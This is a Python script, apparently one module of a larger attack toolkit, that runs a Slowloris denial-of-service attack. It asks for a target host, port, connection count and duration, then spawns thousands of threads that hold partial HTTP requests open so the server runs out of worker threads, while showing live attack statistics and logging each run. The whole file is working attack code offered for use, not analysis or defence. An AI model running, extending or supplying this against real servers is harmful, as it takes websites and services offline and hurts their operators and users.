#!/usr/bin/env python3
# Slowloris Attack with Real-time Live Logs

import socket
import threading
import time
from modules.utils import pcolor, resolve
from modules.logger import save_log

def slowloris_attack(ip, port, stop_event, stats):
    sockets = []
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\n"
            s.send(request.encode())
            sockets.append(s)
            stats['packets'] += 1
            
            if len(sockets) > 500:
                sockets.pop(0).close()
        except:
            stats['errors'] += 1

def slowloris():
    pcolor("b", "\n[ SLOWLORIS ATTACK ]\n")
    pcolor("y", "[!] Slowloris keeps connections open - exhausts server threads\n")
    
    target = input("Target IP: ")
    if not target.replace('.', '').isdigit():
        ip = resolve(target)
        if not ip:
            input("Press Enter...")
            return
    else:
        ip = target
    
    port = int(input("Port (default 80): ") or 80)
    threads = int(input("Connections (1000-5000, default 2000): ") or 2000)
    duration = int(input("Duration in seconds (default 60): ") or 60)
    
    print(f"\nTarget: {ip}:{port}")
    print(f"Connections: {threads}")
    print(f"Duration: {duration}s")
    
    confirm = input("\nStart attack? (y/n): ")
    if confirm.lower() != 'y':
        return
    
    stop_event = threading.Event()
    stats = {'packets': 0, 'errors': 0}
    
    for _ in range(threads):
        t = threading.Thread(target=slowloris_attack, args=(ip, port, stop_event, stats))
        t.daemon = True
        t.start()
    
    pcolor("g", f"\n[!] SLOWLORIS ATTACK STARTED on {ip}:{port}")
    pcolor("y", "[!] Keeping connections open... Press Ctrl+C to stop\n")
    
    start_time = time.time()
    last_packets = 0
    
    try:
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            
            pps = stats['packets'] - last_packets
            last_packets = stats['packets']
            
            bar_length = 30
            progress = int((elapsed / duration) * bar_length)
            bar = "█" * progress + "░" * (bar_length - progress)
            
            print(f"\r[{bar}] {elapsed}/{duration}s | "
                  f"✅ Connections: {stats['packets']:,} | "
                  f"❌ Failed: {stats['errors']:,} | "
                  f"⚡ {pps} c/s    ", end="")
            
            time.sleep(1)
        
        print()
        
    except KeyboardInterrupt:
        pcolor("y", "\n\n[!] Attack stopped by user")
    finally:
        stop_event.set()
        
        print("\n" + "="*60)
        pcolor("g", "[+] ATTACK FINISHED")
        print(f"[📊] Total connections opened: {stats['packets']:,}")
        print(f"[⚠️] Failed connections: {stats['errors']:,}")
        print("="*60)
        
        save_log(ip, port, "SLOWLORIS", threads, duration, 
                 stats['packets'], stats['errors'])
    
    input("\nPress Enter...")
